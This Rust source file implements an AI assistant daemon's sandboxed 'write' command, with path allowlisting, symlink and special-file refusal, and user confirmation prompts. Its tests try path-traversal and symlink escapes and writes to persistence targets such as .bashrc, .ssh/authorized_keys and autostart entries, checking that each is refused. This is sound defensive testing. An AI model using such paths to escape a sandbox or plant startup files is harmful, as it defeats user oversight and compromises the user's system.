//! `write`: write a file at an allowlisted path, asking the user first outside the shared scratch.

use std::path::{Path, PathBuf};
use std::sync::Arc;

use assistd_ipc::{Access, ConfirmSource};
use assistd_utils::path::{lexical_clean, split_at_existing, tilde_remainder};
use assistd_utils::text::human_size;
use async_trait::async_trait;
use rustix::fs::{FileType, Mode, OFlags};
use rustix::io::Errno;
use tokio::io::AsyncWriteExt;

use crate::TurnContext;
use crate::chain::Word;
use crate::command::{Command, CommandError, CommandInput, CommandOutput, Hint, Usage};
use crate::exec::POLICY_DENIED_EXIT;
use crate::policy::{
    Action, Analysis, Approval, Class, Confirmation, ConfirmationGate, ConfirmationRequest, Effect,
    PathGuards, Review, Risk, SandboxInfo, Summary, Unattended, WatchedPath, admits_edit,
    guarded_review, on_blocking_pool, spoken_path, watched_refusal,
};

/// Leading characters of the content shown when asking to confirm a write; bytes when the
/// content is not UTF-8.
const PREVIEW_HEAD_CHARS: usize = 8192;
/// Trailing characters shown after the head when the content is longer; bytes likewise.
const PREVIEW_TAIL_CHARS: usize = 2048;

/// Writable-path allowlist of canonical prefixes, non-empty by construction.
#[derive(Debug, Clone)]
pub struct WritePolicyCfg {
    first: PathBuf,
    rest: Vec<PathBuf>,
    protected: Vec<PathBuf>,
}

impl WritePolicyCfg {
    /// A policy over canonicalized writable prefixes, or `None` if none
    /// were given.
    pub fn new(writable_paths: Vec<PathBuf>) -> Option<Self> {
        let mut prefixes = writable_paths.into_iter();
        let first = prefixes.next()?;
        Some(Self {
            first,
            rest: prefixes.collect(),
            protected: Vec::new(),
        })
    }

    /// A policy permitting writes only beneath the canonical `dir`.
    pub(crate) fn within(dir: PathBuf) -> Self {
        Self {
            first: dir,
            rest: Vec::new(),
            protected: Vec::new(),
        }
    }

    /// Also refuse anything under the canonical `dirs`, even inside a
    /// writable prefix.
    pub fn protecting(mut self, dirs: Vec<PathBuf>) -> Self {
        self.protected = dirs;
        self
    }

    /// The permitted path prefixes, in configuration order.
    pub fn prefixes(&self) -> impl Iterator<Item = &PathBuf> {
        std::iter::once(&self.first).chain(&self.rest)
    }

    /// Resolve `raw` to the path that will be written, refusing anything
    /// outside the allowlist, a symlink, or hidden at any depth below a prefix.
    fn resolve(&self, raw: &str, home: Option<&str>) -> Result<PathBuf, PathResolveError> {
        let resolved = resolve_for_allowlist(raw, home)?;
        if self.protected.iter().any(|dir| resolved.starts_with(dir)) {
            return Err(PathResolveError::Protected);
        }
        if resolved.is_symlink() {
            return Err(PathResolveError::Symlink);
        }
        if self.prefixes().any(|prefix| admits_edit(prefix, &resolved)) {
            Ok(resolved)
        } else if self.prefixes().any(|prefix| resolved.starts_with(prefix)) {
            Err(PathResolveError::Hidden)
        } else {
            Err(PathResolveError::NotAllowlisted)
        }
    }
}

/// `write PATH [CONTENT...]`: write the joined args (or else stdin) to an absolute, allowlisted
/// PATH as an edit under the path guards; the shared scratch directory never asks. Policy
/// refusals exit 126.
#[derive(Debug)]
pub struct WriteCommand {
    cfg: Arc<WritePolicyCfg>,
    gate: Arc<dyn ConfirmationGate>,
    sandbox: Arc<SandboxInfo>,
}

impl WriteCommand {
    /// A `write` command confined to `cfg`'s allowlist, asking `gate`
    /// before writing outside `sandbox`'s shared scratch directory, and
    /// noting a file `sandbox` hides from `bash`.
    pub fn new(
        cfg: Arc<WritePolicyCfg>,
        gate: Arc<dyn ConfirmationGate>,
        sandbox: Arc<SandboxInfo>,
    ) -> Self {
        Self { cfg, gate, sandbox }
    }

    /// The path to write once the write may go ahead: it lands in the shared scratch, the
    /// review clears it, or the gate approves; a path another task watches goes through
    /// [`Self::authorized_to_start`] instead. `Err` holds the refusal or cancellation.
    async fn authorized(
        &self,
        turn: &TurnContext,
        target: WriteTarget,
        content: &[u8],
        raw_path: &str,
    ) -> Result<PathBuf, CommandError> {
        let locked = self.sandbox.watched.locked_for(turn.task_run());
        if let Some(watch) = locked.over(&target.path) {
            return self
                .authorized_to_start(turn, target, watch, content, raw_path)
                .await;
        }
        if self
            .scratch()
            .is_some_and(|dir| target.path.starts_with(dir))
        {
            return Ok(target.path);
        }
        match target.review {
            Review::Clear => Ok(target.path),
            Review::Refuse(why) => Err(write_refused(raw_path, &why)),
            Review::Ask(confirmation, unattended) => {
                let request =
                    confirmation_request(&target.path, content, &confirmation, unattended);
                if self.gate.confirm(turn, request).await == Approval::Deny {
                    Err(self.write_cancelled(raw_path))
                } else {
                    Ok(target.path)
                }
            }
        }
    }

    /// The path to write once the user agreed to a write that starts a run of `watch`'s task,
    /// asked in every mode with no "always allow"; refused in a task run, where nobody is
    /// present to start another task.
    async fn authorized_to_start(
        &self,
        turn: &TurnContext,
        target: WriteTarget,
        watch: &WatchedPath,
        content: &[u8],
        raw_path: &str,
    ) -> Result<PathBuf, CommandError> {
        if turn.task_run().is_some() {
            let why = watch.refusal(raw_path);
            return Err(watched_refusal(
                "write",
                &why,
                "a path the task does not watch",
            ));
        }
        let confirmation = match target.review {
            Review::Refuse(why) => return Err(write_refused(raw_path, &why)),
            Review::Ask(confirmation, _) => confirmation,
            Review::Clear => Confirmation::Edit(vec![raw_path.to_string()]),
        };
        let request = starting_task(
            confirmation_request(&target.path, content, &confirmation, Unattended::Never),
            watch,
        );
        if self.gate.confirm(turn, request).await == Approval::Deny {
            Err(self.write_cancelled(raw_path))
        } else {
            Ok(target.path)
        }
    }

    /// [`WritePolicyCfg::resolve`] against `$HOME`, then [`review_write`] under the path
    /// guards, on the blocking pool, since both stat the path.
    async fn resolve(&self, raw_path: String) -> Result<WriteTarget, PathResolveError> {
        let cfg = Arc::clone(&self.cfg);
        let sandbox = Arc::clone(&self.sandbox);
        let home = std::env::var("HOME").ok();
        on_blocking_pool(move || {
            let path = cfg.resolve(&raw_path, home.as_deref())?;
            let review = review_write(&sandbox.path_guards(), &path, &cfg);
            Ok(WriteTarget { path, review })
        })
        .await
    }

    fn scratch(&self) -> Option<&Path> {
        self.sandbox.shared.scratch.as_deref()
    }

    fn write_cancelled(&self, raw_path: &str) -> CommandError {
        let recovery = match self.scratch() {
            Some(scratch) => format!(
                "a path under {}, or ask the user to make this change",
                scratch.display()
            ),
            None => "asking the user to make this change".to_string(),
        };
        CommandError::new(
            POLICY_DENIED_EXIT,
            format_args!("{raw_path}: write cancelled by user"),
            Hint::Try,
            recovery,
        )
    }
}

#[async_trait]
impl Command for WriteCommand {
    fn name(&self) -> &'static str {
        "write"
    }

    fn summary(&self) -> &'static str {
        "write a file (allowlist-gated) from stdin or inline args"
    }

    fn usage(&self) -> Usage {
        let sharing_hint = self.sandbox.sharing_hint();
        let body = format!(
            "Write bytes to PATH. Two shapes:\n  \
           `echo \"hi\" | write PATH`   - stdin is the file content (pipeline form)\n  \
           `write PATH hello world`   - args beyond PATH are joined by spaces and written\n\
         \n\
         PATH must be absolute (relative paths are rejected) and must fall \
         under one of the prefixes in `[tools.write] writable_paths`. \
         Symlinks, devices, pipes, sockets, and hidden (dot) entries at any \
         depth below a prefix, are refused. Writes outside the shared scratch \
         directory ask the user first unless the permission mode accepts edits; \
         credentials, startup files, shell profiles and directories on PATH \
         always ask, and so does a path a saved task watches, since the write \
         starts that task; a task run may write only where its own task watches. \
         A file under /tmp \
         or /run is not visible to `bash` scripts, which get empty ones of \
         their own; for a file they must see, use {sharing_hint}. \
         Tilde expansion is supported. Exit 126 on policy denial or a \
         declined confirmation, 1 on write failure (permissions, \
         no-such-dir, etc.).\n"
        );
        Usage::new("PATH [CONTENT...]", body)
    }

    /// The path expands its own `~`, and content is written as given, so a glob in either
    /// never turns into other files' names.
    fn expands_args(&self) -> bool {
        false
    }

    async fn run(&self, input: CommandInput) -> Result<CommandOutput, CommandError> {
        let (raw_path, content): (&Word, Vec<u8>) = match (input.args.split_first(), input.stdin) {
            (Some((path, words @ [_, ..])), _) => {
                (path, Word::joined_by_spaces(words).into_bytes())
            }
            (Some((path, [])), Some(stdin)) => (path, stdin),
            (None, _) | (Some(_), None) => return Ok(CommandOutput::usage(self.help())),
        };

        let write_target = self
            .resolve(raw_path.text.clone())
            .await
            .map_err(|e| e.refusal(raw_path.as_str(), self.scratch()))?;
        let path = self
            .authorized(&input.turn, write_target, &content, raw_path.as_str())
            .await?;

        let hidden_by = self.sandbox.private_dir_hiding(path.clone()).await;
        write_without_symlinks(path.clone(), content)
            .await
            .map_err(|failure| failure.error(raw_path))?;
        Ok(CommandOutput {
            accesses: vec![Access::Wrote(path)],
            stderr: hidden_by.map_or_default(|dir| {
                hidden_from_bash_note(raw_path.as_str(), &dir, &self.sandbox.sharing_hint())
                    .into_bytes()
            }),
            ..CommandOutput::default()
        })
    }
}

/// A resolved write destination and what the path guards make of writing it.
#[derive(Debug)]
struct WriteTarget {
    path: PathBuf,
    review: Review,
}

#[derive(Debug)]
enum PathResolveError {
    Relative,
    HomeNotSet,
    AnchorMissing(String),
    NotAllowlisted,
    Protected,
    Symlink,
    Hidden,
}

impl PathResolveError {
    fn refusal(&self, raw_path: &str, scratch: Option<&Path>) -> CommandError {
        if let (Self::NotAllowlisted, Some(scratch)) = (self, scratch) {
            return CommandError::new(
                POLICY_DENIED_EXIT,
                format_args!("{raw_path}: path not in writable allowlist"),
                Hint::Try,
                format_args!("a path under {}", scratch.display()),
            );
        }
        let (what, hint, recovery) = match self {
            Self::Relative => (
                format!("{raw_path}: relative paths not permitted"),
                Hint::Try,
                "an absolute path under an allowlisted directory",
            ),
            Self::HomeNotSet => (
                format!("{raw_path}: cannot expand ~ ($HOME not set)"),
                Hint::Try,
                "writing an explicit absolute path instead of ~",
            ),
            Self::AnchorMissing(anchor) => (
                format!("{raw_path}: cannot resolve ancestor {anchor}"),
                Hint::Check,
                "that the directory exists or widen [tools.write] writable_paths",
            ),
            Self::NotAllowlisted => (
                format!("{raw_path}: path not in writable allowlist"),
                Hint::Check,
                "[tools.write] writable_paths in config",
            ),
            Self::Protected => (
                format!("{raw_path}: assistd's own configuration is not writable"),
                Hint::Try,
                "asking the user to make this change themselves",
            ),
            Self::Symlink => (
                format!("{raw_path}: is a symlink"),
                Hint::Try,
                "writing to the file it points at",
            ),
            Self::Hidden => (
                format!("{raw_path}: hidden files and directories are not writable"),
                Hint::Try,
                "asking the user to make this change themselves",
            ),
        };
        CommandError::new(POLICY_DENIED_EXIT, what, hint, recovery)
    }
}

#[derive(Debug)]
enum WriteFailure {
    NotRegularFile,
    Io(std::io::Error),
}

impl WriteFailure {
    fn error(&self, raw_path: &Word) -> CommandError {
        match self {
            Self::NotRegularFile => CommandError::new(
                POLICY_DENIED_EXIT,
                format_args!("{raw_path}: not a regular file (device, pipe, or socket)"),
                Hint::Try,
                "a path to a regular file, or to one that does not exist yet",
            ),
            Self::Io(e) => CommandError::io(raw_path, e),
        }
    }
}

impl From<std::io::Error> for WriteFailure {
    fn from(e: std::io::Error) -> Self {
        Self::Io(e)
    }
}

impl From<Errno> for WriteFailure {
    fn from(errno: Errno) -> Self {
        Self::Io(errno.into())
    }
}

/// A write's content as the confirmation prompt shows it.
#[derive(Debug)]
struct Preview {
    shown: String,
    /// How much is written, worded to follow "a write of".
    amount: String,
    /// Why the user cannot read the content off `shown` as it will be written, if they cannot.
    caveat: Option<&'static str>,
}

impl Preview {
    /// `content` as text when it is UTF-8, and as escaped bytes otherwise, so that different
    /// contents never show the same.
    fn of(content: &[u8]) -> Self {
        match std::str::from_utf8(content) {
            Ok(text) => Self::text(text),
            Err(_) => Self::escaped_bytes(content),
        }
    }

    fn text(text: &str) -> Self {
        let total = text.chars().count();
        let (shown, caveat) = match total.checked_sub(PREVIEW_HEAD_CHARS + PREVIEW_TAIL_CHARS) {
            None | Some(0) => (text.to_string(), None),
            Some(omitted) => {
                let mut shown: String = text.chars().take(PREVIEW_HEAD_CHARS).collect();
                shown.push_str(&format!("\n… {omitted} characters not shown …\n"));
                shown.extend(text.chars().skip(PREVIEW_HEAD_CHARS + omitted));
                (shown, Some("content too long to show in full"))
            }
        };
        Self {
            shown,
            amount: counted(text.lines().count(), "line"),
            caveat,
        }
    }

    fn escaped_bytes(content: &[u8]) -> Self {
        let invalid = content
            .utf8_chunks()
            .map(|chunk| chunk.invalid().len())
            .sum();
        let mut shown = format!(
            "not UTF-8 ({}), shown as escaped bytes:\n",
            counted(invalid, "invalid byte")
        );
        match content
            .len()
            .checked_sub(PREVIEW_HEAD_CHARS + PREVIEW_TAIL_CHARS)
        {
            None | Some(0) => shown.push_str(&content.escape_ascii().to_string()),
            Some(omitted) => {
                let (head, rest) = content.split_at(PREVIEW_HEAD_CHARS);
                shown.push_str(&format!(
                    "{}\n… {omitted} bytes not shown …\n{}",
                    head.escape_ascii(),
                    rest[omitted..].escape_ascii()
                ));
            }
        }
        Self {
            shown,
            amount: format!("{} that are not UTF-8 text", counted(content.len(), "byte")),
            caveat: Some("content that is not UTF-8"),
        }
    }
}

async fn write_without_symlinks(path: PathBuf, content: Vec<u8>) -> Result<(), WriteFailure> {
    let open = tokio::task::spawn_blocking(move || open_without_symlinks(&path));
    let mut file = tokio::fs::File::from_std(open.await.map_err(std::io::Error::other)??);
    file.write_all(&content).await?;
    Ok(file.flush().await?)
}

/// Open `path` for writing without blocking, refusing anything but a
/// regular file; a FIFO with no reader fails the open with `ENXIO`.
fn open_without_symlinks(path: &Path) -> Result<std::fs::File, WriteFailure> {
    let fd = rustix::fs::openat2(
        rustix::fs::CWD,
        path,
        OFlags::WRONLY
            | OFlags::CREATE
            | OFlags::TRUNC
            | OFlags::CLOEXEC
            | OFlags::NONBLOCK
            | OFlags::NOCTTY,
        Mode::from_raw_mode(0o666),
        rustix::fs::ResolveFlags::NO_SYMLINKS,
    )
    .map_err(|errno| {
        if errno == Errno::NXIO {
            WriteFailure::NotRegularFile
        } else {
            WriteFailure::from(errno)
        }
    })?;
    if !FileType::from_raw_mode(rustix::fs::fstat(&fd)?.st_mode).is_file() {
        return Err(WriteFailure::NotRegularFile);
    }
    rustix::fs::fcntl_setfl(
        &fd,
        rustix::fs::fcntl_getfl(&fd)?.difference(OFlags::NONBLOCK),
    )?;
    Ok(std::fs::File::from(fd))
}

/// Resolve `raw` to an absolute path whose ancestors are canonical and
/// whose final component is kept as written.
fn resolve_for_allowlist(raw: &str, home: Option<&str>) -> Result<PathBuf, PathResolveError> {
    let expanded = expand_tilde(raw, home)?;
    if !expanded.is_absolute() {
        return Err(PathResolveError::Relative);
    }
    let cleaned = lexical_clean(&expanded);
    match (cleaned.parent(), cleaned.file_name()) {
        (Some(parent), Some(file_name)) => {
            Ok(canonicalize_existing_prefix(parent)?.join(file_name))
        }
        _ => canonicalize_existing_prefix(&cleaned),
    }
}

fn canonicalize_existing_prefix(path: &Path) -> Result<PathBuf, PathResolveError> {
    let (anchor, tail) = split_at_existing(path);
    let canonical_anchor = std::fs::canonicalize(&anchor)
        .map_err(|_| PathResolveError::AnchorMissing(anchor.to_string_lossy().into_owned()))?;
    if tail.as_os_str().is_empty() {
        Ok(canonical_anchor)
    } else {
        Ok(canonical_anchor.join(tail))
    }
}

fn expand_tilde(raw: &str, home: Option<&str>) -> Result<PathBuf, PathResolveError> {
    if tilde_remainder(raw).is_none() {
        return Ok(PathBuf::from(raw));
    }
    let home = home.ok_or(PathResolveError::HomeNotSet)?;
    Ok(assistd_utils::path::expand_tilde(raw, Path::new(home)))
}

fn hidden_from_bash_note(raw_path: &str, dir: &Path, sharing_hint: &str) -> String {
    format!(
        "[note] write: {raw_path} is written, but bash scripts cannot see it: the sandbox \
         gives each bash call its own empty {}. {}: {sharing_hint}\n",
        dir.display(),
        Hint::Use,
    )
}

/// Writing `path` as an edit under the path guards: refused when catastrophic, always asked
/// when sensitive, and unattended in accept-edits mode inside `cfg`'s writable prefixes.
fn review_write(guards: &PathGuards, path: &Path, cfg: &WritePolicyCfg) -> Review {
    let analysis = Analysis {
        class: Class::Edit,
        effects: vec![Effect {
            action: Action::Write,
            path: path.display().to_string(),
            recursive: false,
        }],
        carried: Vec::new(),
        always_allow: Vec::new(),
        runs_approved: false,
    };
    let edit_scope: Vec<PathBuf> = cfg.prefixes().cloned().collect();
    guarded_review(guards, analysis, &edit_scope, &cfg.protected)
}

/// The target, size and content (head and tail only when long) for the user to confirm. Content
/// too long to show in full, or not UTF-8, is [`Risk::Elevated`] and never runs unasked.
fn confirmation_request(
    path: &Path,
    content: &[u8],
    confirmation: &Confirmation,
    unattended: Unattended,
) -> ConfirmationRequest {
    let preview = Preview::of(content);
    let script = format!(
        "write {path:?} ({})\n{}",
        human_size(u64::try_from(content.len()).unwrap_or(u64::MAX)),
        preview.shown
    );
    let (risk, unattended, matched_pattern) = match preview.caveat {
        None => (confirmation.risk(), unattended, confirmation.to_string()),
        Some(caveat) => (
            Risk::Elevated,
            Unattended::Never,
            format!("{confirmation}, with {caveat}"),
        ),
    };
    ConfirmationRequest {
        tool: "write".to_string(),
        script,
        matched_pattern,
        summary: write_summary(path, &preview.amount, confirmation),
        always_allow: Vec::new(),
        risk,
        unattended,
        source: ConfirmSource::Main,
    }
}

/// `request` for a write under `watch`, which starts a run of its task: said so, and asked
/// in every mode.
fn starting_task(request: ConfirmationRequest, watch: &WatchedPath) -> ConfirmationRequest {
    let starts = format!(
        "changes a path the task \"{}\" watches, which starts a run of it",
        watch.task_name
    );
    ConfirmationRequest {
        matched_pattern: format!("{}; it {starts}", request.matched_pattern),
        summary: Summary::of(request.summary.what).because(format!("It {starts}.")),
        risk: Risk::Elevated,
        unattended: Unattended::Never,
        ..request
    }
}

/// A write of `amount` to `path` that asks because of `confirmation`, in a sentence.
fn write_summary(path: &Path, amount: &str, confirmation: &Confirmation) -> Summary {
    let summary = Summary::of(format!("a write of {amount} to {}", spoken_path(path)));
    match confirmation {
        Confirmation::Sensitive(why) => summary.because(format!("It {why}.")),
        Confirmation::Unvetted { .. } | Confirmation::Edit(_) => summary,
    }
}

/// `count` of `noun`, which takes an "s" unless there is one.
fn counted(count: usize, noun: &str) -> String {
    match count {
        1 => format!("1 {noun}"),
        _ => format!("{count} {noun}s"),
    }
}

fn write_refused(raw_path: &str, why: &str) -> CommandError {
    CommandError::new(
        POLICY_DENIED_EXIT,
        format_args!("{raw_path}: refused in every mode: it {why}"),
        Hint::Try,
        "a path inside the folder instead",
    )
}

#[cfg(test)]
mod tests {
    use std::os::unix::net::UnixListener;
    use std::time::Duration;

    use tempfile::tempdir;

    use assistd_ipc::{PermissionMode, TaskId, TaskRunId};
    use parking_lot::Mutex;

    use super::*;
    use crate::TurnContext;
    use crate::command::CommandRegistry;
    use crate::command::run_rendered;
    use crate::commands::test_support::{RecordingGate, RecordingParking, router_in, test_sandbox};
    use crate::policy::{ConfirmRouter, GuardRoots, IpcConfirmationGate, SharedDirs};
    use crate::test_support::{AlwaysAllowGate, DenyAllGate, inert_sandbox};

    fn cfg_from<P: AsRef<Path>>(paths: &[P]) -> Arc<WritePolicyCfg> {
        let abs: Vec<PathBuf> = paths
            .iter()
            .map(|p| std::fs::canonicalize(p.as_ref()).expect("canonicalize tempdir"))
            .collect();
        Arc::new(WritePolicyCfg::new(abs).expect("non-empty allowlist"))
    }

    fn scoped_edit(path: &str) -> WriteTarget {
        WriteTarget {
            path: PathBuf::from(path),
            review: Review::Ask(
                Confirmation::Edit(vec![path.into()]),
                Unattended::ScopedEdit,
            ),
        }
    }

    fn args_writing(path: &Path) -> CommandInput {
        CommandInput {
            args: vec![Word::bare(path.display().to_string()), Word::bare("hi")],
            stdin: None,
            scope: crate::FileScope::Host,
            turn: TurnContext::default(),
        }
    }

    async fn write_under(allowed: &Path, args: &[&str], stdin: Option<&[u8]>) -> CommandOutput {
        run_rendered(
            &WriteCommand::new(
                cfg_from(&[allowed]),
                Arc::new(AlwaysAllowGate),
                test_sandbox(),
            ),
            CommandInput {
                args: args.iter().copied().map(Word::bare).collect(),
                stdin: stdin.map(<[u8]>::to_vec),
                scope: crate::FileScope::Host,
                turn: TurnContext::default(),
            },
        )
        .await
    }

    #[tokio::test]
    async fn write_rejected_outside_allowlist() {
        let dir = tempdir().unwrap();
        let outside = tempdir().unwrap();
        let target = outside.path().join("target.txt");
        let target_str = target.to_string_lossy().into_owned();
        let out = write_under(dir.path(), &[&target_str, "oops"], None).await;
        assert_eq!(out.exit_code, 126);
        assert_eq!(
            String::from_utf8_lossy(&out.stderr),
            format!(
                "[error] write: {target_str}: path not in writable allowlist. \
                 Check: [tools.write] writable_paths in config\n"
            )
        );
        assert!(!target.exists());
    }

    #[tokio::test]
    async fn write_allowlist_resolves_dotdot() {
        let root = tempdir().unwrap();
        let allowed = root.path().join("allowed");
        std::fs::create_dir(&allowed).unwrap();
        let escaped = root.path().join("escaped.txt");
        let tricky = format!("{}/../escaped.txt", allowed.display());
        let out = write_under(&allowed, &[&tricky, "oops"], None).await;
        assert_eq!(out.exit_code, 126);
        assert_eq!(
            String::from_utf8_lossy(&out.stderr),
            format!(
                "[error] write: {tricky}: path not in writable allowlist. \
                 Check: [tools.write] writable_paths in config\n"
            )
        );
        assert!(!escaped.exists());
    }

    #[tokio::test]
    async fn write_allowlist_rejects_relative_path() {
        let dir = tempdir().unwrap();
        let out = write_under(dir.path(), &["relative.txt", "hi"], None).await;
        assert_eq!(out.exit_code, 126);
        assert_eq!(
            String::from_utf8_lossy(&out.stderr),
            "[error] write: relative.txt: relative paths not permitted. \
             Try: an absolute path under an allowlisted directory\n"
        );
    }

    #[test]
    fn write_allowlist_expands_tilde() {
        let dir = tempdir().unwrap();
        let home = dir.path().to_str().expect("tempdir path is valid utf-8");
        let resolved =
            resolve_for_allowlist("~/tilde-target.txt", Some(home)).expect("tilde resolves");
        let expected = std::fs::canonicalize(dir.path())
            .expect("tempdir canonicalizes")
            .join("tilde-target.txt");
        assert_eq!(resolved, expected);
    }

    #[tokio::test]
    async fn dangling_symlink_escaping_allowlist_is_rejected() {
        let allowed = tempdir().unwrap();
        let outside = tempdir().unwrap();
        let escape_target = outside.path().join("escaped.txt");
        let link = allowed.path().join("link");
        std::os::unix::fs::symlink(&escape_target, &link).unwrap();

        let out = write_under(allowed.path(), &[&link.to_string_lossy(), "oops"], None).await;
        assert_eq!(out.exit_code, 126, "{:?}", out.stderr);
        assert!(!escape_target.exists());
    }

    #[tokio::test]
    async fn dangling_symlink_directory_escaping_allowlist_is_rejected() {
        let allowed = tempdir().unwrap();
        let outside = tempdir().unwrap();
        let missing = outside.path().join("missing");
        let link = allowed.path().join("dir");
        std::os::unix::fs::symlink(&missing, &link).unwrap();

        let target = link.join("file.txt");
        let out = write_under(allowed.path(), &[&target.to_string_lossy(), "oops"], None).await;
        assert_eq!(out.exit_code, 126, "{:?}", out.stderr);
        assert!(!missing.exists());
    }

    #[tokio::test]
    async fn symlink_final_component_is_refused() {
        let dir = tempdir().unwrap();
        let real = dir.path().join("real.txt");
        std::fs::write(&real, b"old").unwrap();
        let link = dir.path().join("link");
        std::os::unix::fs::symlink(&real, &link).unwrap();

        let link_str = link.to_string_lossy().into_owned();
        let out = write_under(dir.path(), &[&link_str, "new"], None).await;
        assert_eq!(out.exit_code, POLICY_DENIED_EXIT);
        assert_eq!(
            String::from_utf8_lossy(&out.stderr),
            format!(
                "[error] write: {link_str}: is a symlink. Try: writing to the file it points at\n"
            )
        );
        assert_eq!(std::fs::read(&real).unwrap(), b"old");
    }

    #[tokio::test]
    async fn symlinked_ancestor_inside_the_allowlist_writes_to_its_target() {
        let dir = tempdir().unwrap();
        let real_dir = dir.path().join("real");
        std::fs::create_dir(&real_dir).unwrap();
        let dir_link = dir.path().join("dir-link");
        std::os::unix::fs::symlink(&real_dir, &dir_link).unwrap();

        let target = dir_link.join("out.txt");
        let out = write_under(dir.path(), &[&target.to_string_lossy(), "hi"], None).await;
        assert_eq!(
            out.exit_code,
            0,
            "{:?}",
            String::from_utf8_lossy(&out.stderr)
        );
        assert_eq!(std::fs::read(real_dir.join("out.txt")).unwrap(), b"hi");
    }

    #[test]
    fn open_refuses_any_symlink_in_the_path() {
        let dir = tempdir().unwrap();
        let real_dir = dir.path().join("real");
        std::fs::create_dir(&real_dir).unwrap();
        let dir_link = dir.path().join("dir-link");
        std::os::unix::fs::symlink(&real_dir, &dir_link).unwrap();
        let file_link = dir.path().join("file-link");
        std::os::unix::fs::symlink(real_dir.join("target.txt"), &file_link).unwrap();

        for path in [dir_link.join("target.txt"), file_link] {
            open_without_symlinks(&path).expect_err("symlinks must not be followed");
        }
        assert!(!real_dir.join("target.txt").exists());
    }

    #[tokio::test]
    async fn hidden_entries_at_any_depth_below_a_prefix_are_refused() {
        let dir = tempdir().unwrap();
        std::fs::create_dir(dir.path().join(".ssh")).unwrap();
        std::fs::create_dir_all(dir.path().join("repo").join(".git")).unwrap();
        for target in [
            dir.path().join(".bashrc"),
            dir.path().join(".ssh").join("authorized_keys"),
            dir.path()
                .join(".config")
                .join("autostart")
                .join("x.desktop"),
            dir.path().join("repo").join(".git").join("config"),
            dir.path().join("repo").join(".envrc"),
        ] {
            let target_str = target.to_string_lossy().into_owned();
            let out = write_under(dir.path(), &[&target_str, "oops"], None).await;
            assert_eq!(out.exit_code, POLICY_DENIED_EXIT, "{target_str}");
            assert_eq!(
                String::from_utf8_lossy(&out.stderr),
                format!(
                    "[error] write: {target_str}: hidden files and directories are not writable. \
                     Try: asking the user to make this change themselves\n"
                )
            );
            assert!(!target.exists());
        }
    }

    #[tokio::test]
    async fn hidden_directory_listed_as_a_prefix_is_writable() {
        let dir = tempdir().unwrap();
        let hidden = dir.path().join(".notes");
        std::fs::create_dir(&hidden).unwrap();
        let target = hidden.join("todo.txt");
        let out = run_rendered(
            &WriteCommand::new(
                cfg_from(&[dir.path(), hidden.as_path()]),
                Arc::new(AlwaysAllowGate),
                test_sandbox(),
            ),
            CommandInput {
                args: vec![Word::bare(target.to_string_lossy()), Word::bare("hi")],
                stdin: None,
                scope: crate::FileScope::Host,
                turn: TurnContext::default(),
            },
        )
        .await;
        assert_eq!(
            out.exit_code,
            0,
            "{:?}",
            String::from_utf8_lossy(&out.stderr)
        );
        assert_eq!(std::fs::read(&target).unwrap(), b"hi");
    }

    #[tokio::test]
    async fn overwrites_and_truncates_existing_file() {
        let dir = tempdir().unwrap();
        let path = dir.path().join("out.txt");
        std::fs::write(&path, b"much longer old content").unwrap();

        let out = write_under(dir.path(), &[&path.to_string_lossy(), "new"], None).await;
        assert_eq!(out.exit_code, 0, "{:?}", out.stderr);
        assert_eq!(std::fs::read(&path).unwrap(), b"new");
    }

    #[tokio::test]
    async fn globs_stay_literal_and_a_missing_content_never_truncates() {
        let dir = tempdir().unwrap();
        let dir_path = dir.path().display();
        for name in ["a.md", "b.md"] {
            std::fs::write(dir.path().join(name), b"keep").unwrap();
        }
        let mut registry = CommandRegistry::new();
        registry.register(WriteCommand::new(
            cfg_from(&[dir.path()]),
            Arc::new(AlwaysAllowGate),
            test_sandbox(),
        ));
        let run = |line: String| {
            let registry = &registry;
            async move {
                crate::chain::execute(
                    &crate::chain::parse_chain(&line).unwrap(),
                    registry,
                    &TurnContext::default(),
                )
                .await
            }
        };

        let out = run(format!("write {dir_path}/notes.txt use *.md here")).await;
        assert_eq!(out.exit_code, 0, "{:?}", out.stderr);
        assert_eq!(
            std::fs::read(dir.path().join("notes.txt")).unwrap(),
            b"use *.md here"
        );

        let out = run(format!("write {dir_path}/*.md hello")).await;
        assert_eq!(out.exit_code, 0, "{:?}", out.stderr);
        assert_eq!(std::fs::read(dir.path().join("*.md")).unwrap(), b"hello");
        let out = run(format!("write {dir_path}/a.md")).await;
        assert_ne!(out.exit_code, 0);
        for name in ["a.md", "b.md"] {
            assert_eq!(
                std::fs::read(dir.path().join(name)).unwrap(),
                b"keep",
                "{name}"
            );
        }
    }

    fn assert_not_regular_file_refusal(out: &CommandOutput, target: &str) {
        assert_eq!(out.exit_code, POLICY_DENIED_EXIT, "{target}");
        assert_eq!(
            String::from_utf8_lossy(&out.stderr),
            format!(
                "[error] write: {target}: not a regular file (device, pipe, or socket). \
                 Try: a path to a regular file, or to one that does not exist yet\n"
            )
        );
    }

    #[tokio::test]
    async fn fifo_without_a_reader_is_refused_without_blocking() {
        let dir = tempdir().unwrap();
        let fifo = dir.path().join("pipe");
        rustix::fs::mkfifoat(rustix::fs::CWD, &fifo, Mode::from_raw_mode(0o600)).unwrap();
        let target = fifo.to_string_lossy().into_owned();

        let out = tokio::time::timeout(
            Duration::from_secs(5),
            write_under(dir.path(), &[&target, "hi"], None),
        )
        .await
        .expect("writing to a FIFO must not block");
        assert_not_regular_file_refusal(&out, &target);
    }

    #[tokio::test]
    async fn fifo_with_a_reader_is_refused() {
        let dir = tempdir().unwrap();
        let fifo = dir.path().join("pipe");
        rustix::fs::mkfifoat(rustix::fs::CWD, &fifo, Mode::from_raw_mode(0o600)).unwrap();
        let _reader =
            rustix::fs::open(&fifo, OFlags::RDONLY | OFlags::NONBLOCK, Mode::empty()).unwrap();
        let target = fifo.to_string_lossy().into_owned();

        let out = tokio::time::timeout(
            Duration::from_secs(5),
            write_under(dir.path(), &[&target, "hi"], None),
        )
        .await
        .expect("writing to a FIFO must not block");
        assert_not_regular_file_refusal(&out, &target);
    }

    #[tokio::test]
    async fn sockets_and_devices_are_refused() {
        let dir = tempdir().unwrap();
        let socket = dir.path().join("sock");
        let _listener = UnixListener::bind(&socket).unwrap();
        for (allowed, target) in [
            (dir.path(), socket.as_path()),
            (Path::new("/dev"), Path::new("/dev/null")),
        ] {
            let target = target.to_string_lossy().into_owned();
            let out = write_under(allowed, &[&target, "hi"], None).await;
            assert_not_regular_file_refusal(&out, &target);
        }
    }

    #[tokio::test]
    async fn refuses_a_protected_directory_inside_a_writable_one() {
        let dir = tempdir().unwrap();
        let config = dir.path().join("assistd");
        std::fs::create_dir(&config).unwrap();
